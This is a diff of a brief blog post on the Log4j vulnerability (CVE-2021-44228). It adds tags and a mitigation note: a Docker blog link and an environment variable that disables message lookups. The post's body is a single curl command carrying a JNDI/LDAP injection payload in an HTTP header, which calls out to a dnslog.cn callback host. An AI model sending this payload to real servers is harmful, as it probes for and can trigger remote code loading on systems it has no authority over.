@@ -2,8 +2,13 @@
 layout: post
 title:  "log4j"
 date:   2021-12-09 13:11:00 +0200
-categories: tor
+categories: log4j java tomcat
 ---
 ```
 curl https://hostname -H 'X-Api-Version: ${jndi:ldap://xxx.dnslog.cn/a}'
+```
+mitigation:<br>
+(https://www.docker.com/blog/apache-log4j-2-cve-2021-44228/)[https://www.docker.com/blog/apache-log4j-2-cve-2021-44228/]
+```
+ENV LOG4J_FORMAT_MSG_NO_LOOKUPS=true
 ```
